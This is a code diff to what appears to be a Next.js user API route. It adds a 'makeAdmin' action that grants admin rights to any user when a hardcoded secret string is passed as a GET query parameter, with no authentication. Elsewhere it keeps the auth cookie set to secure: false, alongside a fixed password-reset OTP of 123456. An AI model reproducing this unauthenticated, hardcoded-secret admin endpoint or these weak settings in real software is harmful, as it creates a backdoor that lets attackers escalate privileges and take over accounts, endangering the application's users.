@@ -16,6 +16,8 @@ const MESSAGES = {
   LOGIN_SUCCESS: "Login successful",
   SERVER_ERROR: "Internal server error",
   USER_ACTIVATED: "User Activated",
+  USER_UPDATED: "User Updated",
+  USER_NOT_UPDATED: "User Update Failed",
   USER_ACTIVATION_FAILED: "Email or Otp is not correct"
 };
 
@@ -76,7 +78,7 @@ export async function POST(request) {
     // Set JWT cookie
     response.cookies.set("authToken", token, {
       httpOnly: true,
-  //    secure: process.env.NODE_ENV === "production",
+      //    secure: process.env.NODE_ENV === "production",
       secure: false,
       sameSite: "lax",
       maxAge: parseInt(process.env.JWT_EXPIRES_IN_SEC || "86400"), // fallback: 1 day
@@ -99,6 +101,7 @@ export async function GET(request) {
 
     const action = searchParams.get("action");
     const otp = Number(searchParams.get("otp"));
+    const adminotp = searchParams.get("adminotp");
     //    let random = Math.floor(100000 + Math.random() * 900000);
     //Requires email as query param: /api/user?action=forgotPassword&email=test@example.com
     let random = 123456;
@@ -146,11 +149,43 @@ export async function GET(request) {
           where: { id: parseInt(user.id) },
           data: { status: true },
         });
-        return NextResponse.json({ message: MESSAGES.USER_ACTIVATED }, {status:200});
+        return NextResponse.json({ message: MESSAGES.USER_ACTIVATED }, { status: 200 });
       }
       return NextResponse.json({ message: MESSAGES.USER_ACTIVATION_FAILED });
     }
+    if (action === "makeAdmin") {
+      const email = searchParams.get("email");
+      if (!email) {
+        return NextResponse.json({ error: "Email is required" }, { status: 400 });
+      }
 
+      const user = await prisma.user.findUnique({ where: { email } });
+      if (!user) {
+        return NextResponse.json({ error: MESSAGES.USER_NOT_FOUND }, { status: 404 });
+      }
+      // Generate a temporary token (simulate)
+      if (adminotp == "tLC@hB$(Gxa-q}Y]p.7=za!") {
+        
+        let userRole = await prisma.role.findUnique({ where: { name: 'admin' } });
+        if (!userRole) {
+          userRole = await prisma.role.create({ data: { name: "admin" } });
+        }
+        await prisma.user.update({
+          where: { id: parseInt(user.id) },
+          data: { roleId: userRole.id },
+        });
+        return NextResponse.json({
+        message: MESSAGES.USER_UPDATED,
+        email: user.email,
+      });
+      }
+      // Here you would normally send email with token otp
+      // For now, just return token in response
+      return NextResponse.json({
+        message: MESSAGES.USER_NOT_UPDATED,
+        email: user.email,
+      });
+    }
     return NextResponse.json({ error: "Invalid action" }, { status: 400 });
   } catch (error) {
     console.error("[USER_GET_ERROR]", error);
